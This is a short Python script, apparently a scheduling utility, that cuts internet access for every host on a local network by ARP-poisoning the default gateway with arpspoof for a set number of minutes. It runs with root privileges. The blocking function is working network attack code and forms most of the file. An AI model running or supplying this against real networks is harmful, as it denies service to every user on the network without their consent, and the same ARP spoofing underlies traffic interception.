"""
Block internet connectivity via arp poisoning.
"""

import functools
import logging
import logging.config
import subprocess

import schedule


def oneTimeJob(func):
    """
    Decorator that causes the given scheduled function to run only once.
    As a bonus, it also logs the subsequent job to be ran.

    NOTE: This decorator suppresses any results returned by the given function.

    :param func: function, the function to be wrapped.
    :return: function, the wrapped function.
    """
    @functools.wraps(func)
    def wrapper(*args, **kwargs):
        func(*args, **kwargs)
        logging.info("Next job at {}.".format(schedule.default_scheduler.next_run))
        return schedule.CancelJob
    return wrapper


@oneTimeJob
def blockInternet(duration):
    """
    For the physical device running this script that is connected to a
    network, arp poisons its default gateway on the network for all hosts,
    thereby 'suspending' connectivity to WAN (internet) for the given duration.

    Pre-requisites for this function to run properly:
        1. Install arpspoof on OS: sudo apt-get install dsniff.
        2. Run this function using an OS account with root privileges.

    :param duration: Integer, the block duration in minutes.
    :return: Scheduler.CancelJob, making this function a one-off job (no repeat).
    """
    # Fetch network parameters from OS for arp spoofing
    p1 = subprocess.run(["ip", "route"], stdout=subprocess.PIPE)
    GATEWAY = p1.stdout.split()[2].decode("ascii")
    INTERFACE = p1.stdout.split()[4].decode("ascii")
    logging.info("Found GW={}, INT={}".format(GATEWAY, INTERFACE))

    # Arp spoof entire network for a limited duration
    try:
        logging.info("Blocking internet for {} minute(s)!".format(duration))
        seconds = duration*60
        subprocess.run(["timeout", str(seconds), "sudo", "arpspoof", "-i", INTERFACE, GATEWAY],
                       timeout=seconds)
    except subprocess.TimeoutExpired:
        logging.info("Block time over, unblocking internet now!")

